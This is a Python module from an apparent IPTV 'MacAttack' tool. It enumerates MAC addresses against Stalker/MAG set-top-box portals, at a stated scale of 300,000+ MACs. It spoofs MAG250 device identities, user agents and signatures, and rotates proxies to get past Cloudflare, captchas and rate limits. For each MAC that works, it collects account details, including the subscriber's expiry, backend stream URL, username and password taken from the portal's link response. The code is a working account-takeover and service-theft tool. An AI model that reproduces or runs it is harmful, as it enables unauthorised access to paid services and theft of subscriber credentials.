"""
STB API Client v3.0 - Async + Robust QuickScan
- AsyncIO for efficient concurrent requests
- 2-Phase: QuickScan (Token + Channels) → FullScan (Details)
- Proxy errors don't kill MACs (retry with different proxy)
- Chunking support for 300k+ MACs
- Proper error classification for intelligent retry
"""
import asyncio
import aiohttp
import hashlib
import json
import time
import logging
from urllib.parse import urlparse, quote
from typing import Optional, Tuple, Dict, Any

logger = logging.getLogger("MacAttack.stb_async")

# ============== ERROR TYPES ==============

class ProxyError(Exception):
    """Base proxy error - retry MAC with different proxy"""
    pass

class ProxyDeadError(ProxyError):
    """Proxy unreachable (connection refused, DNS fail)"""
    pass

class ProxySlowError(ProxyError):
    """Proxy timeout"""
    pass

class ProxyBlockedError(ProxyError):
    """Proxy blocked by portal (403, rate limit)"""
    pass

class PortalError(Exception):
    """Portal-side error - MAC is actually invalid"""
    pass

# ============== HELPERS ==============

def parse_proxy(proxy_str: Optional[str]) -> Optional[str]:
    """Parse proxy string to aiohttp format."""
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if proxy_str.startswith(("socks5://", "socks4://", "http://")):
        return proxy_str
    return f"http://{proxy_str}"

def generate_device_ids(mac: str) -> Tuple[str, str, str, str]:
    """Generate device IDs from MAC."""
    sn = hashlib.md5(mac.encode()).hexdigest().upper()[:13]
    device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
    device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
    hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
    return sn, device_id, device_id2, hw_version_2

def get_headers(token: Optional[str] = None, token_random: Optional[int] = None) -> Dict[str, str]:
    """Get request headers."""
    headers = {
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
        "Accept-Encoding": "identity",
        "Accept": "*/*",
        "Connection": "close",
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if token_random is not None:
        headers["X-Random"] = str(token_random)
    return headers

def get_cookies(mac: str) -> Dict[str, str]:
    """Get request cookies."""
    sn, device_id, device_id2, hw_version_2 = generate_device_ids(mac)
    return {
        "adid": hw_version_2, "debug": "1", "device_id2": device_id2,
        "device_id": device_id, "hw_version": "1.7-BD-00", "mac": mac,
        "sn": sn, "stb_lang": "en", "timezone": "America/Los_Angeles",
    }

def get_portal_info(url: str) -> Tuple[str, str]:
    """Extract base URL and portal type from URL."""
    url = url.rstrip('/')
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or 80
    scheme = parsed.scheme or "http"
    base = f"{scheme}://{host}:{port}"
    
    if "stalker_portal" in url:
        return base, "stalker_portal/server/load.php"
    return base, "portal.php"

# ============== ASYNC HTTP CLIENT ==============

async def do_request(session: aiohttp.ClientSession, url: str, cookies: Dict, headers: Dict, 
                    proxy: Optional[str], timeout: int) -> aiohttp.ClientResponse:
    """
    Make async HTTP request with proper error handling.
    
    Raises:
    - ProxyDeadError: Connection refused, DNS fail, proxy unreachable
    - ProxySlowError: Timeout, gateway errors
    - ProxyBlockedError: 403, 429, Cloudflare/Captcha
    - PortalError: Portal-side errors (401, backend not available)
    """
    timeout_config = aiohttp.ClientTimeout(connect=3, total=timeout)
    
    try:
        async with session.get(url, cookies=cookies, headers=headers, 
                              proxy=proxy, timeout=timeout_config) as resp:
            
            # Read response content
            content = await resp.text()
            
            # Check for portal errors (not proxy related)
            if "REMOTE_ADDR" in content or "Backend not available" in content:
                raise PortalError("Portal backend error")
            
            # Check for Cloudflare / HTML error pages
            content_type = resp.headers.get("Content-Type", "").lower()
            if "text/html" in content_type:
                if "cloudflare" in content.lower() or "captcha" in content.lower():
                    raise ProxyBlockedError("Cloudflare/Captcha detected")
                if resp.status >= 400:
                    raise ProxyBlockedError(f"HTTP {resp.status} - HTML response")
            
            # HTTP 401 = Portal says MAC is invalid (not proxy issue)
            if resp.status == 401:
                raise PortalError("401 Unauthorized - Invalid MAC")
            
            # HTTP 403 = Could be proxy blocked OR MAC invalid
            if resp.status == 403:
                try:
                    data = await resp.json()
                    if isinstance(data, dict):
                        # Valid JSON response = Portal error, not proxy
                        raise PortalError("403 Forbidden - Portal rejected MAC")
                except:
                    pass
                # Invalid JSON = Proxy blocked
                raise ProxyBlockedError("403 Forbidden - Proxy blocked")
            
            # Gateway errors = Proxy slow/overloaded
            if resp.status in (502, 503, 504):
                raise ProxySlowError(f"Gateway error {resp.status}")
            
            # 429 = Rate limit (proxy blocked)
            if resp.status == 429:
                raise ProxyBlockedError("Rate limit exceeded")
            
            # Create response-like object for compatibility
            class AsyncResponse:
                def __init__(self, status, content, headers):
                    self.status_code = status
                    self.text = content
                    self.headers = headers
                
                def json(self):
                    return json.loads(self.text)
            
            return AsyncResponse(resp.status, content, resp.headers)
            
    except asyncio.TimeoutError:
        raise ProxySlowError("Request timeout")
    except aiohttp.ClientConnectorError as e:
        err = str(e).lower()
        if any(x in err for x in ["refused", "unreachable", "no route", "dns"]):
            raise ProxyDeadError(str(e))
        raise ProxySlowError(str(e))
    except aiohttp.ClientProxyConnectionError:
        raise ProxyDeadError("Proxy connection error")
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError, PortalError):
        raise
    except Exception as e:
        raise ProxyError(str(e))

# ============== QUICKSCAN FUNCTION ==============

async def quickscan_mac(session: aiohttp.ClientSession, url: str, mac: str, 
                       proxy: Optional[str] = None, timeout: int = 10) -> Tuple[bool, Dict[str, Any]]:
    """
    QuickScan MAC - Fast validation with Token + Channel count
    
    Returns: (is_valid, result_dict)
    - is_valid: True if token received AND channels > 0
    - result_dict: Basic info (mac, channels, token data)
    
    Raises: ProxyDeadError, ProxySlowError, ProxyBlockedError, PortalError
    """
    base_url, portal_type = get_portal_info(url)
    cookies = get_cookies(mac)
    headers = get_headers()
    
    result = {
        "mac": mac,
        "channels": 0,
        "token": None,
        "token_random": None,
        "portal_type": portal_type,
    }
    
    # Step 1: Handshake - Get token
    handshake_url = f"{base_url}/{portal_type}?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
    
    resp = await do_request(session, handshake_url, cookies, headers, proxy, timeout)
    
    # Parse token
    try:
        data = resp.json()
        token = data.get("js", {}).get("token")
        token_random = data.get("js", {}).get("random")
    except (json.JSONDecodeError, ValueError) as e:
        raise ProxySlowError(f"Invalid JSON response: {e}")
    
    if not token:
        raise PortalError("No token received")
    
    result["token"] = token
    result["token_random"] = token_random
    
    # Step 2: Get channels count (critical for validation)
    headers = get_headers(token, token_random)
    ch_url = f"{base_url}/{portal_type}?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
    
    resp = await do_request(session, ch_url, cookies, headers, proxy, timeout)
    
    try:
        data = resp.json()
    except (json.JSONDecodeError, ValueError):
        raise ProxySlowError("Invalid JSON in get_channels")
    
    if "js" in data and "data" in data["js"]:
        result["channels"] = len(data["js"]["data"])
    
    # QuickScan validation: Token + Channels > 0
    is_valid = result["channels"] > 0
    
    if not is_valid:
        raise PortalError(f"No channels available ({result['channels']})")
    
    return True, result

# ============== FULLSCAN FUNCTION ==============

async def fullscan_mac(session: aiohttp.ClientSession, url: str, mac: str, quickscan_result: Dict[str, Any],
                      proxy: Optional[str] = None, timeout: int = 15) -> Tuple[bool, Dict[str, Any]]:
    """
    FullScan MAC - Collect all details after successful QuickScan
    
    Args:
        quickscan_result: Result from successful quickscan_mac()
    
    Returns: (success, full_result_dict)
    """
    base_url, portal_type = get_portal_info(url)
    cookies = get_cookies(mac)
    
    token = quickscan_result["token"]
    token_random = quickscan_result["token_random"]
    headers = get_headers(token, token_random)
    
    # Start with quickscan data
    result = {
        "mac": mac,
        "portal": url,
        "channels": quickscan_result["channels"],
        "expiry": "Unknown",
        "genres": [],
        "vod_categories": [],
        "series_categories": [],
        "backend_url": None,
        "username": None,
        "password": None,
        "max_connections": None,
        "created_at": None,
        "client_ip": None,
    }
    
    sn, device_id, device_id2, hw_version_2 = generate_device_ids(mac)
    
    # Calculate sig
    if token_random:
        sig = hashlib.sha256(str(token_random).encode()).hexdigest().upper()
    else:
        sig = hashlib.sha256(f"{sn}{mac}".encode()).hexdigest().upper()
    
    metrics = json.dumps({"mac": mac, "sn": sn, "type": "STB", "model": "MAG250", 
                          "uid": device_id, "random": token_random or 0})
    
    # Step 1: Get profile for IP and billing date
    try:
        profile_url = f"{base_url}/{portal_type}?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r23-250; ImageDate: Wed Aug 29 10:49:53 EEST 2018; PORTAL version: 5.3.1; API Version: JS API version: 343; STB API version: 146; Player Engine version: 0x58c&num_banks=2&sn={sn}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id={device_id2}&device_id2={device_id2}&sig={sig}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics={quote(metrics)}&hw_version_2={hw_version_2}&timestamp={int(time.time())}&api_sig=262&prehash=0"
        resp = await do_request(session, profile_url, cookies, headers, proxy, timeout)
        
        try:
            data = resp.json()
            if "js" in data:
                result["client_ip"] = data["js"].get("ip")
                if data["js"].get("expire_billing_date"):
                    result["expiry"] = data["js"]["expire_billing_date"]
        except:
            pass
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
        raise
    except:
        pass
    
    # Step 2: Get account info for expiry
    try:
        main_url = f"{base_url}/{portal_type}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
        resp = await do_request(session, main_url, cookies, headers, proxy, timeout)
        
        try:
            data = resp.json()
            js = data.get("js", {})
            phone = js.get("phone", "")
            
            if phone:
                try:
                    # Try to convert Unix timestamp to readable date
                    timestamp = int(phone)
                    expiry = time.strftime("%B %d, %Y", time.gmtime(timestamp))
                    result["expiry"] = expiry
                except (ValueError, TypeError):
                    result["expiry"] = str(phone)
        except:
            pass
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
        raise
    except:
        pass
    
    # Step 3: Get genres (for DE detection)
    try:
        g_url = f"{base_url}/{portal_type}?type=itv&action=get_genres&JsHttpRequest=1-xml"
        resp = await do_request(session, g_url, cookies, headers, proxy, timeout)
        
        try:
            data = resp.json()
            if "js" in data:
                result["genres"] = [g.get("title", "") for g in data["js"] if g.get("id") != "*"]
        except:
            pass
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
        raise
    except:
        pass
    
    # Step 4: Get VOD categories (non-critical)
    try:
        v_url = f"{base_url}/{portal_type}?type=vod&action=get_categories&JsHttpRequest=1-xml"
        resp = await do_request(session, v_url, cookies, headers, proxy, timeout)
        
        try:
            data = resp.json()
            if "js" in data:
                result["vod_categories"] = [c.get("title", "") for c in data["js"] if c.get("id") != "*"]
        except:
            pass
    except:
        pass
    
    # Step 5: Get series categories (non-critical)
    try:
        s_url = f"{base_url}/{portal_type}?type=series&action=get_categories&JsHttpRequest=1-xml"
        resp = await do_request(session, s_url, cookies, headers, proxy, timeout)
        
        try:
            data = resp.json()
            if "js" in data:
                result["series_categories"] = [c.get("title", "") for c in data["js"] if c.get("id") != "*"]
        except:
            pass
    except:
        pass
    
    # Step 6: Get backend/credentials (non-critical)
    try:
        link_url = f"{base_url}/{portal_type}?type=itv&action=create_link&cmd=http://localhost/ch/10000_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml"
        resp = await do_request(session, link_url, cookies, headers, proxy, timeout)
        
        try:
            data = resp.json()
            cmd = data.get("js", {}).get("cmd", "")
            if cmd:
                cmd = cmd.replace("ffmpeg ", "").replace("'ffmpeg' ", "")
                parsed = urlparse(cmd)
                if parsed.hostname:
                    result["backend_url"] = f"{parsed.scheme}://{parsed.hostname}"
                    if parsed.port:
                        result["backend_url"] += f":{parsed.port}"
                    parts = parsed.path.strip("/").split("/")
                    if len(parts) >= 2:
                        result["username"], result["password"] = parts[0], parts[1]
        except:
            pass
    except:
        pass
    
    return True, result

# ============== COMBINED TEST FUNCTION ==============

async def test_mac_async(session: aiohttp.ClientSession, url: str, mac: str, 
                        proxy: Optional[str] = None, timeout: int = 15, 
                        quickscan_only: bool = False) -> Tuple[bool, Dict[str, Any]]:
    """
    Test MAC with 2-phase approach:
    1. QuickScan: Token + Channels validation
    2. FullScan: Complete details collection (if quickscan_only=False)
    
    Returns: (is_valid, result_dict)
    
    Raises: ProxyDeadError, ProxySlowError, ProxyBlockedError, PortalError
    """
    # Phase 1: QuickScan
    try:
        quickscan_success, quickscan_result = await quickscan_mac(session, url, mac, proxy, timeout)
        
        if not quickscan_success:
            return False, quickscan_result
        
        # If only quickscan requested, return early
        if quickscan_only:
            return True, quickscan_result
        
        # Phase 2: FullScan
        fullscan_success, fullscan_result = await fullscan_mac(session, url, mac, quickscan_result, proxy, timeout)
        
        return fullscan_success, fullscan_result
        
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError, PortalError):
        raise
    except Exception as e:
        logger.error(f"Unexpected error testing MAC {mac}: {e}")
        return False, {"mac": mac, "error": str(e)}